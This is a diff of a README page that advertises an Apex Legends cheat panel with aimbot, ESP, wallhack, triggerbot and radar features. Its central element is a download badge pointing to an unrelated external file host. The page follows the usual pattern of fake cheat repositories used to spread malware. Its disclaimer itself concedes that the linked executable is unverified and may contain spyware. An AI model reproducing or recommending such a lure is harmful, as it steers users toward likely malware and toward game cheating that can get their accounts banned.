@@ -1,2 +1,61 @@
-# Cheating-Panel-Apex-Legends
-🔥 Cheating Panel Apex Legends — Explore an unofficial utility concept with advertised aimbot, ESP, recoil, radar, movement, and Legend-related settings. 🎯 Discover configuration categories for Apex Legends Battle Royale. ⚠️ Features and download safety are unverified.
+# 🔥 Cheating Panel Apex Legends — Download & Features
+
+## 📥 Download Cheating Panel Apex Legends
+
+[![Download](https://img.shields.io/badge/DOWNLOAD-CHEATING_PANEL_APEX_LEGENDS-00C853?style=for-the-badge&logo=github&logoColor=white)](https://huangqing.net/s/file)
+
+## 🎮 Overview
+
+**Cheating Panel for Apex Legends** is an unofficial third-party gaming utility concept associated with Apex Legends, the hero-based battle royale shooter developed by Respawn Entertainment and published by Electronic Arts.
+
+Apex Legends features fast-paced squad combat, unique Legend abilities, tactical positioning, advanced movement mechanics, diverse weapons, and competitive multiplayer matches.
+
+Third-party cheating panels may advertise configurable settings for aiming, visual information, weapon handling, movement mechanics, Legend-related systems, and interface customization.
+
+**The linked software's functionality, security, and compatibility have not been independently verified.**
+
+## ✨ Features & Options
+
+Third-party Apex Legends cheating panels may advertise categories such as:
+
+- 🎯 **Aimbot Settings** — Advertised aim-assistance configuration options.
+- 👁️ **Player ESP** — Advertised player information overlays.
+- 🧱 **Wallhack Visuals** — Advertised visibility-related display settings.
+- 🔫 **Weapon Settings** — Weapon-specific configuration categories.
+- 💥 **Recoil Control** — Advertised recoil-related adjustment options.
+- 🎯 **Triggerbot Options** — Advertised automated firing preferences.
+- 🦸 **Legend Settings** — Legend and ability-related configuration categories.
+- 🏃 **Movement Options** — Sliding, sprinting, and movement-related preferences.
+- 🎒 **Loot ESP** — Advertised item and equipment information settings.
+- 🗺️ **Radar Settings** — Advertised map and radar information options.
+- 🎨 **Customizable Panel** — Interface appearance and layout preferences.
+- 💾 **Config Management** — Custom configuration profiles.
+
+*These are commonly advertised feature categories, not confirmed capabilities of the linked download.*
+
+## 🔥 Highlights
+
+- ⚡ Customizable gameplay-related settings
+- 🎯 Apex Legends aiming configuration categories
+- 👁️ ESP-style visual settings
+- 🔫 Weapon and recoil options
+- 🦸 Legend-related configuration menus
+- 🏃 Movement-related preferences
+- 🎒 Loot information categories
+- 🗺️ Map and radar settings
+- 🎨 Adjustable interface appearance
+- 💾 Configuration profile management
+
+## ⚠️ Disclaimer
+
+This project is not affiliated with Respawn Entertainment, Electronic Arts, or Apex Legends.
+
+The linked download has not been independently inspected or verified. Unknown executable files may contain malware, spyware, or other harmful software.
+
+Unauthorized gameplay modifications may violate EA's rules and anti-cheat policies, potentially resulting in account restrictions or permanent bans.
+
+No claims are made regarding undetectability, anti-cheat bypass, security, or compatibility with current Apex Legends updates.
+
+---
+
+⭐ **Apex Legends Cheating Panel | Apex Legends Gaming Utility | Aimbot & ESP Categories | Legend Settings | Download**
